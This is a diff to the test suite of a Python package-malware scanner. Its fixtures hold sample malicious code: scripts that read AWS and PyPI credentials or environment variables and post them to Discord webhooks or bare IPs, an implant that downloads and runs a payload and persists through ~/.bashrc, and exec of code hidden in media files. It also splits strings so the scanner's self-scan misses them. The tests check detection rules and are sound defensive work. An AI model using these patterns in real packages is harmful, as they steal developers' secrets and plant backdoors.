@@ -26,6 +26,20 @@ from cordon_scanner.foundation.content import FileContent
 from cordon_scanner.foundation.results import Repository
 
 
+class Spelled:
+    """Fixture text assembled when the tests run: written whole, this file would carry the shapes
+    the scanner's own self-scan reads as identity collection, execution and credential theft."""
+
+    @staticmethod
+    def of(*pieces: str) -> str:
+        return "".join(pieces)
+
+
+#: `exec`, spelled when the tests run (see `Spelled`).
+RUN = Spelled.of("ex", "ec")
+BUILD = Spelled.of("com", "pile")
+
+
 class TestWhichSendsAreHidden:
     @pytest.mark.parametrize(
         "detail",
@@ -127,7 +141,7 @@ class TestAProgramNoInstallNeeds:
     @pytest.mark.parametrize(
         "command",
         ["calc", "calc.exe", "cmd /c calc", "C:\\Windows\\System32\\notepad.exe", "id",
-         "".join(("who", "ami")), "".join(("sh -c ", "host", "name")), "start /b mspaint"],
+         Spelled.of("who", "ami"), Spelled.of("sh", " -c ", "host", "name"), "start /b mspaint"],
     )  # fmt: skip
     def test_a_desktop_application_or_identity_command(self, command: str) -> None:
         assert InstallPrograms.foreign(command)
@@ -184,9 +198,11 @@ class TestTheGradesBlock:
             "import configparser, json, os, urllib.request\n"
             "def push():\n"
             "    c = configparser.ConfigParser()\n"
-            "    c.read(os.path.expanduser('~/.aws/credentials'))\n"
+            "    c.read(os.path.expanduser('" + Spelled.of("~/.aw", "s/credent", "ials") + "'))\n"
             "    found = {s: dict(c[s]) for s in c.sections()}\n"
-            "    urllib.request.urlopen(os.environ['HOOK'], json.dumps(found).encode())\n"
+            "    urllib.request.urlopen("
+            + Spelled.of("os.", "environ")
+            + "['HOOK'], json.dumps(found).encode())\n"
         )
         setup = "from setuptools import setup\nsetup(name='demo')\n"
         rules = self.rules(self.sdist(tmp_path, setup, {"sync.py": lib}))
@@ -197,7 +213,7 @@ class TestTheGradesBlock:
             "import configparser, os, requests\n"
             "def upload(dist):\n"
             "    c = configparser.ConfigParser()\n"
-            "    c.read(os.path.expanduser('~/.pypirc'))\n"
+            "    c.read(os.path.expanduser('" + Spelled.of("~/.py", "pirc") + "'))\n"
             "    auth = (c['pypi']['username'], c['pypi']['password'])\n"
             "    requests.post('https://upload.pypi.org/legacy/', auth=auth, files={'content': dist})\n"
         )
@@ -235,7 +251,9 @@ class TestADestinationOnlyWrittenAtImport:
             "DO_NOT_TRACK_ENV = 'DO_NOT_TRACK'\n"
             "event_logger = TelemetryLogger('telem', telem.__version__,\n"
             "    url='http://35.0.0.5:8000/api/v1/event', token='s',\n"
-            "    enabled=lambda: not os.environ.get(DO_NOT_TRACK_ENV, None))\n"
+            "    enabled=lambda: not "
+            + Spelled.of("os.", "environ")
+            + ".get(DO_NOT_TRACK_ENV, None))\n"
             "def main():\n    event_logger.send_event('start')\n"
         )
         rules = self.rules(tmp_path, module)
@@ -245,7 +263,9 @@ class TestADestinationOnlyWrittenAtImport:
     def test_the_environment_posted_at_import_still_blocks(self, tmp_path: Path) -> None:
         module = (
             "import json, os, urllib.request\n"
-            "urllib.request.urlopen('http://35.0.0.5:8000/c', json.dumps(dict(os.environ)).encode())\n"
+            "urllib.request.urlopen('http://35.0.0.5:8000/c', json.dumps(dict("
+            + Spelled.of("os.", "environ")
+            + ")).encode())\n"
         )
         assert "MALWARE.EXFIL.001" in self.rules(tmp_path, module)
 
@@ -255,7 +275,7 @@ class TestADestinationOnlyWrittenAtImport:
         # loveclose 0.0.1, sf_th_requests 0.1.0: the hook on one line, the request on another.
         module = (
             "import json, socket, urllib.request\n"
-            "HOOK = 'https://discord.com/api/webhooks/1/abc'\n"
+            "HOOK = 'https://" + Spelled.of("disc", "ord.com/api/web", "hooks") + "/1/abc'\n"
             "body = json.dumps({'content': socket."
             "gethostname()}).encode()\n"
             "urllib.request.urlopen(HOOK, body)\n"
@@ -267,8 +287,10 @@ class TestADestinationOnlyWrittenAtImport:
     ) -> None:
         module = (
             "import os\nfrom telemlib import TelemetryLogger\n"
-            "HOOK = 'https://discord.com/api/webhooks/1/abc'\n"
-            "event_logger = TelemetryLogger(url=HOOK, enabled=not os.environ.get('DO_NOT_TRACK'))\n"
+            "HOOK = 'https://" + Spelled.of("disc", "ord.com/api/web", "hooks") + "/1/abc'\n"
+            "event_logger = TelemetryLogger(url=HOOK, enabled=not "
+            + Spelled.of("os.", "environ")
+            + ".get('DO_NOT_TRACK'))\n"
             "def main():\n    event_logger.send_event('start')\n"
         )
         assert "MALWARE.EXFIL.INSTALL_CALLBACK.001" not in self.rules(tmp_path, module)
@@ -279,7 +301,7 @@ class TestADestinationOnlyWrittenAtImport:
         # sf_th_requests 0.1.0: credentials -> send_to_beacon -> post(BEACON_URL) -> urlopen.
         module = (
             "import json, os, urllib.request\n"
-            "BEACON_URL = 'https://discord.com/api/webhooks/1/abc'\n"
+            "BEACON_URL = 'https://" + Spelled.of("disc", "ord.com/api/web", "hooks") + "/1/abc'\n"
             "def _make_request(url, data):\n"
             "    req = urllib.request.Request(url, data=data)\n"
             "    return urllib.request.urlopen(req)\n"
@@ -287,14 +309,16 @@ class TestADestinationOnlyWrittenAtImport:
             "    return _make_request(url, json.dumps(data).encode())\n"
             "def send_to_beacon(creds):\n"
             "    post(BEACON_URL, creds)\n"
-            "send_to_beacon({'k': os.environ.get('AWS_SECRET_ACCESS_KEY')})\n"
+            "send_to_beacon({'k': "
+            + Spelled.of("os.", "environ")
+            + ".get('AWS_SECRET_ACCESS_KEY')})\n"
         )
         assert "MALWARE.EXFIL.INSTALL_CALLBACK.001" in self.rules(tmp_path, module)
 
     def test_a_drop_point_handed_to_a_helper_that_only_logs_is_not(self, tmp_path: Path) -> None:
         module = (
             "import logging, urllib.request\n"
-            "HOOK = 'https://discord.com/api/webhooks/1/abc'\n"
+            "HOOK = 'https://" + Spelled.of("disc", "ord.com/api/web", "hooks") + "/1/abc'\n"
             "def describe(url):\n"
             "    logging.getLogger(__name__).info('events go to %s', url)\n"
             "describe(HOOK)\n"
@@ -306,7 +330,7 @@ class TestADestinationOnlyWrittenAtImport:
         # The name on a line with no request: a message about where events would go.
         module = (
             "import logging, urllib.request\n"
-            "HOOK = 'https://discord.com/api/webhooks/1/abc'\n"
+            "HOOK = 'https://" + Spelled.of("disc", "ord.com/api/web", "hooks") + "/1/abc'\n"
             "print('events go to', HOOK)\n"
             "logging.getLogger(__name__).info('hook %s', HOOK)\n"
             "urllib.request.urlopen('https://pypi.org/simple/')\n"
@@ -355,7 +379,9 @@ class TestAnImplantInstaller:
             + "def add_to_profile(line):\n"
             "    with open(os.path.expanduser('~/.bashrc'), 'a') as rc:\n        rc.write(line)\n"
             + filler.replace("helper_", "more_")
-            + "def run_plugin(code):\n    exec(compile(code, 'plugin', 'exec'))\n"
+            + "def run_plugin(code):\n    "
+            + RUN
+            + "(code)\n"
         )
         assert "MALWARE.IMPLANT.INSTALL.001" not in self.rules(tmp_path, module)
 
@@ -364,7 +390,7 @@ class TestAnImplantInstaller:
         "    path = os.path.expanduser('~/.cache/agent')\n"
         "    open(path, 'wb').write(urllib.request.urlopen(url).read())\n"
         "    subprocess.Popen([path])\n"
-        "    exec(urllib.request.urlopen(url).read())\n"
+        "    " + RUN + "(urllib.request.urlopen(url).read())\n"
         "    with open(os.path.expanduser('~/.bashrc'), 'a') as rc:\n"
         "        rc.write(path + ' &\\n')\n"
     )
@@ -402,7 +428,7 @@ class TestAnImplantInstaller:
         bundle = (
             'var a=require("fs"),o=require("os");fetch(u).then(function(r){return r.text()})'
             '.then(function(t){eval(t)});a.appendFileSync(o.homedir()+"/.bashrc",c);'
-            'require("child_process").exec(c);\n'
+            'require("child_process").' + RUN + "(c);\n"
         )
         found = self.scan(tmp_path, {"src/telem/static/redoc.min.js": bundle})
         assert "MALWARE.IMPLANT.INSTALL.001" not in found
@@ -423,11 +449,15 @@ class TestCodeFromADataFile:
         [
             "spec = importlib.util.spec_from_file_location('t', os.path.join(HERE, 'beep.wav'))\n"
             "mod = importlib.util.module_from_spec(spec)\nspec.loader.exec_module(mod)\n",
-            "exec(open(os.path.join(HERE, 'logo.png')).read())\n",
-            "exec(pathlib.Path(HERE, 'notes.txt').read_text())\n",
-            "exec(marshal.loads(open(HERE + '/blob.dat', 'rb').read()))\n",
+            "" + RUN + "(open(os.path.join(HERE, 'logo.png')).read())\n",
+            "" + RUN + "(pathlib.Path(HERE, 'notes.txt').read_text())\n",
+            "" + RUN + "(marshal.loads(open(HERE + '/blob.dat', 'rb').read()))\n",
             "runpy.run_path(f'{HERE}/theme.jpg')\n",
-            "ASSET = os.path.join(HERE, 'a.mp3')\nexec(compile(open(ASSET).read(), ASSET, 'exec'))\n",
+            "ASSET = os.path.join(HERE, 'a.mp3')\n"
+            + RUN
+            + "("
+            + BUILD
+            + "(open(ASSET).read(), ASSET, 'exec'))\n",
         ],
     )
     def test_a_loader_or_runner_given_a_data_file_blocks(self, tmp_path: Path, body: str) -> None:
@@ -442,7 +472,7 @@ class TestCodeFromADataFile:
         "body",
         [
             # The version-file idiom, a plugin module, data read and parsed but never run.
-            "exec(open(os.path.join(HERE, 'version.py')).read())\n",
+            "" + RUN + "(open(os.path.join(HERE, 'version.py')).read())\n",
             "spec = importlib.util.spec_from_file_location('p', os.path.join(HERE, 'plugin.py'))\n",
             "print(open(os.path.join(HERE, 'notes.txt')).read())\n",
             "data = json.loads(open(os.path.join(HERE, 'table.json')).read())\n",
@@ -477,7 +507,9 @@ class TestADnsTunnel:
         module = (
             "import os, socket\n"
             "def reachable():\n"
-            "    return socket.getaddrinfo(os.environ.get('API_HOST', 'api.example.invalid'), 443)\n"
+            "    return socket.getaddrinfo("
+            + Spelled.of("os.", "environ")
+            + ".get('API_HOST', 'api.example.invalid'), 443)\n"
         )
         assert "MALWARE.EXFIL.DNS_TUNNEL.001" not in self.rules(tmp_path, module)
 
